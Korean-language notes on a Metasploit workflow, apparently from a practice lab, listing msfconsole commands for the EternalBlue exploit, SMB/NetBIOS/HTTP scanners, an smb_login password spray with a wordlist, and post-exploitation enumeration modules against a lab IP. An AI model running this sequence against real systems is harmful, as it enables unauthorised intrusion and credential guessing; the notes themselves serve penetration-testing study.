# select exploit

- msfconsole에서 exploit·auxiliary 모듈을 골라 돌리는 실전 흐름 — eternalblue, portscan/smb_version/netbios/http_version 스캐너, smb_login 패스워드 스프레이, post/windows/gather 열거 모듈.
- 초기 정찰 후 Metasploit으로 스캐너와 익스플로잇을 연속 실행할 때. setg로 공통 rhosts·크리덴셜을 유지하며 모듈만 교체한다.
- 모듈별 옵션 확인(show options)이 필수이고, smb_login에는 SMBUser·PASS_FILE, post 모듈에는 세션 번호(set session, sessions -i)가 필요하다.

use exploit/windows/smb/ms17_010_eternalblue

## set

setg rhosts 10.10.148.128
use auxiliary/scanner/portscan/tcp
run

search smb_version
use auxiliary/scanner/smb/smb_version
run

search netbios
use auxiliary/scanner/netbios/nbname
run

search http_version
show options
setg rport 8000
use auxiliary/scanner/http/http_version
run

search smb_login
show options
set rport 445
setg SMBUser testuser
setg PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
run

## enum domain name

Use post/windows/gather/enum_domain
show options
session -i

session -i 1
run

## search enum

search enu_share
use 0
show options
sessions -l
set session 2
run
